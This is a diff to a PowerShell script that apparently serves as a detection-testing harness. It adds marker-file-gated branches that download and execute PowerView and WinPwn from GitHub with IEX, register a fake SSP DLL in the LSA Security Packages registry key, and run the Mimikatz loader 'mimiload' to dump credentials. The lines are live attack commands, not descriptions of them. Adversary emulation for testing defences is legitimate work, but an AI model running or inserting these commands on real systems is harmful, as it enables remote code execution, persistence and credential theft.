@@ -1,8 +1,34 @@
 $Folder = $HOME + '/Desktop/ImportantDocuments/'
 $Exfil = @("$($HOME)\Desktop\exfil", "$($HOME)\Desktop\exfil.txt")
 $ExfilTest = Test-Path -Path $Exfil -PathType Leaf
+$IOC = @("$($HOME)\Desktop\ioc", "$($HOME)\Desktop\ioc.txt")
+$IOCTest = Test-Path -Path $IOC -PathType Leaf
+$AMSI = @("$($HOME)\Desktop\amsi", "$($HOME)\Desktop\amsi.txt")
+$AMSITest = Test-Path -Path $AMSI -PathType Leaf
 $sample = @("$($HOME)\Desktop\sample", "$($HOME)\Desktop\sample.txt")
 $sampleTest = Test-Path -Path $sample -PathType Leaf
+
+if ($IOCTest.contains('True')) {
+    "Will execute IOC samples"
+    powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://github.com/BC-SECURITY/Empire/blob/86921fbbf4945441e2f9d9e7712c5a6e96eed0f3/empire/server/data/module_source/situational_awareness/network/powerview.ps1'); Get-DomainGPO"
+   
+  } else {
+    "Will not execute IOC samples"
+  }
+
+if ($AMSITest.contains('True')) {
+    "Will execute AMSI samples"
+    $SecurityPackages = Get-ItemProperty HKLM:\System\CurrentControlSet\Control\Lsa -Name 'Security Packages' | Select-Object -ExpandProperty 'Security Packages'
+    $SecurityPackagesUpdated = $SecurityPackages
+    $SecurityPackagesUpdated += "#{fake_ssp_dll}"
+    Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name 'Security Packages' -Value $SecurityPackagesUpdated
+
+    iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
+    mimiload -consoleoutput -noninteractive
+
+  } else {
+    "Will not execute AMSI samples"
+  }
 
 
 "Test to see if folder [$Folder] exists - v3"
